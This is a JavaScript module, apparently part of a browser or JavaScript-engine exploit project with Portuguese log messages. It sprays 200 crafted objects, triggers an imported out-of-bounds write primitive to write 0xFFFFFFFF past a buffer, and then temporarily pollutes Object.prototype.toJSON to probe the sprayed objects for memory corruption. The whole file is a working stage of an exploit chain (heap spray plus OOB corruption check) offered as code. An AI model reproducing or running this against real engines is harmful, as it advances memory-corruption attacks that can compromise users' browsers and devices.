// js/script3/testSprayComplexObjects.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE; 
    }

    checkIntegrity() {
        const FNAME_CHECK = "MyComplexObject.checkIntegrity";
        if (this.marker !== 0xCAFECAFE) {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! Marcador esperado 0xCAFECAFE, obtido ${toHex(this.marker)} !!`, 'critical', FNAME_CHECK);
            return false;
        }
        if (this.value1 !== 12345) {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value1 esperado 12345, obtido ${this.value1} !!`, 'critical', FNAME_CHECK);
            return false;
        }
        if (this.value2 !== "initial_state") {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value2 esperado "initial_state", obtido "${this.value2}" !!`, 'critical', FNAME_CHECK);
            return false;
        }
        return true;
    }

    action() {
        return this.id + " acted, value1 is " + this.value1;
    }
}

// toJSON genérica para sondar o objeto que está sendo stringificado
export function toJSON_ProbeGenericObject() {
    let result_payload = {
        toJSON_executed: "toJSON_ProbeGenericObject",
        this_type: Object.prototype.toString.call(this),
        this_constructor_name: this?.constructor?.name || "N/A",
        error_in_toJSON: null,
        props: {}
    };
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                if (Object.prototype.hasOwnProperty.call(this, prop)) {
                    try {
                        if (['id', 'value1', 'value2', 'marker'].includes(prop) && typeof this[prop] !== 'function') {
                           result_payload.props[prop] = String(this[prop]).substring(0, 50);
                        }
                    } catch (e_prop) {
                        result_payload.props[prop] = `Error accessing: ${e_prop.name}`;
                    }
                }
            }
        }
    } catch (e) {
        result_payload.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    return result_payload;
}


export async function executeSprayAndCorruptComplexObjectsTest() {
    const FNAME_TEST = "executeSprayAndCorruptComplexObjectsTest";
    logS3(`--- Iniciando Teste: Spray de Objetos Complexos, Corrupção OOB, e Sondagem ---`, "test", FNAME_TEST);
    document.title = `Spray Complex & Corrupt`;

    const spray_count = 200; 
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        sprayed_objects.length = 0;
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        sprayed_objects.length = 0;
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados...`, "test", FNAME_TEST);
    document.title = `Sondando ${sprayed_objects.length} ComplexObjs...`;

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let corruption_detected_in_sprayed = false;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ProbeGenericObject, // Usa a toJSON genérica deste arquivo
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        for (let i = 0; i < sprayed_objects.length; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            if (i > 0 && i % 20 === 0) {
                logS3(`   Sondando objeto ${i}/${sprayed_objects.length}...`, 'info', FNAME_TEST);
                await PAUSE_S3(SHORT_PAUSE_S3);
            }

            let integrityOK = true;
            let actionResult = "N/A";
            let stringifyResult = null;
            let errorDuringProbe = null;

            try {
                integrityOK = obj.checkIntegrity(); 
                if (!integrityOK) {
                    logS3(`   !!!! CORRUPÇÃO DE PROPRIEDADE DETECTADA em sprayed_objects[${i}] ANTES de stringify !!!!`, "critical", FNAME_TEST);
                }
                actionResult = obj.action(); 
                stringifyResult = JSON.stringify(obj);

            } catch (e_probe) {
                errorDuringProbe = e_probe;
                logS3(`   !!!! ERRO AO INTERAGIR/STRINGIFY sprayed_objects[${i}] !!!!: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_TEST);
            }

            if (!integrityOK || errorDuringProbe) {
                corruption_detected_in_sprayed = true;
                logS3(`   Objeto Corrompido: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
                logS3(`     Integridade: ${integrityOK}, Resultado Ação: ${actionResult}, Erro Sonda: ${errorDuringProbe ? errorDuringProbe.message : 'Nenhum'}`, "info", FNAME_TEST);
                logS3(`     Resultado Stringify (se houve): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
                document.title = `CORRUPTED ComplexObj @ ${i}!`;
                break; 
            }
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem de objetos complexos: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!corruption_detected_in_sprayed) {
        logS3("Nenhuma corrupção óbvia detectada nos objetos complexos pulverizados.", "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray de Objetos Complexos CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0; 
    globalThis.gc?.(); 
    document.title = corruption_detected_in_sprayed ? document.title : `Spray Complex Done`;
}
